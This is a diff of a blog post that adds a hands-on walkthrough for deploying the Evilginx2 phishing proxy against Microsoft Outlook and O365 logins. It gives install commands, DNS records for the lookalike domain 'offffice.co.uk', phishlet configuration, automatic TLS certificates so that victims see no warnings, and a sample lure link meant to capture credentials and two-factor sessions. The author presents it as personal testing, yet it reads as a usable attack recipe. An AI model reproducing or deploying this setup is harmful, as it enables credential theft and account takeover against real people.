@@ -41,24 +41,92 @@ Now I was armed with a Ubuntu box & a domain I was ready to start configuring Ev
 
 
 
+First I SSH'd into my box with 
 
-
-### [](#header-3)Header 3
-
-```js
-// Javascript code with syntax highlighting.
-var fun = function lang(l) {
-  dateformat.i18n = require('./lang/' + l)
-  return true;
-}
+```
+ssh -i id_rsa root@m0chandroplet
 ```
 
-```ruby
-# Ruby code with syntax highlighting
-GitHubPages::Dependencies.gems.each do |gem, version|
-  s.add_dependency(gem, "= #{version}")
-end
+And ran the below commands
+
 ```
+sudo apt-get install git make
+go get -u github.com/kgretzky/evilginx2
+cd $GOPATH/src/github.com/kgretzky/evilginx2
+make
+sudo make install
+nano /etc/resolv.conf
+nameserver 8.8.8.8
+service systemd-resolved stop
+evilginx
+```
+
+
+
+I also did not include the installation of `GO` as there are numerous tutorials out there. Also worth noting I installed `Evilginx2` under the `root` user but I would strongly advise installing with a lower priv user in production for obvious reasons.
+
+
+
+Now my Ubuntu box was configured and ready to go I had to configure my domain `offffice.co.uk` with relevant `A` records & `nameserver`
+
+Therefore I created the below records
+
+`ns1.offffice.co.uk -> Droplet IP`
+
+`ns2.offffice.co.uk -> Droplet IP`
+
+`A account.offffice.co.uk -> Droplet IP`
+
+`A outlook.offffice.co.uk -> Droplet IP`
+
+`A login.offffice.co.uk -> Droplet IP`
+
+Worthwhile noting that I only configured it for Microsoft Platforms `outlook` & `o365` but of course if you were attacking Facebook, Linkedin you would create a relevant `A` record i/e `facebook.offffice.co.uk` 
+
+Okay - Now we're set let's configure `Evilnginx2` itself.
+
+
+
+## [](#header-2)Evilginx2 Setup
+
+Let's jump straight into it and jump into it by running `evilginx2` - Little tip I advise installing `screens` so you can easily background `evilginx2` and so it won't close when you exit your SSH session. I'm sure if you are reading this you have heard of `screens`though :)
+
+
+
+https://i.imgur.com/WtRxfT5.png
+
+
+
+Now we have to run the below commands to configure our Server IP & Domain Name
+
+```
+config domain offffice.co.uk
+config ip Droplet-IP
+phishlets hostname o365 offffice.co.uk
+phishlets hostname outlook offffice.co.uk
+phishlets enable o365
+phishlets enable outlook
+```
+
+
+
+What makes `evilginx2` so great is that once you run the above commands it will automatically go out and grab an SSL Cert for all relevant domains from `LetsEncrypt` so your victims do not get any `SSL` warnings
+
+
+
+Now finally we have one more step to do and that is configure a `lure` - Lures are basically the extention after the phishing domain i/e `https://outlook.offffice.co.uk/hjk7234` (This is the domain you would send to your victims)
+
+ 
+
+## [](#header-2)Execution
+
+Now our infrastructure is perfectly configured, DNS is configured & phishlets are configured we can now send our domains to our victims. 
+
+For my testing I primarily used `outlook` & `o365` but for this article I will stick with `outlook` as it easier to get a `2FA` enabled account. In my case my phishing link was `https://outlook.offffice.co.uk/LnhgUquX`
+
+
+
+
 
 #### [](#header-4)Header 4
 
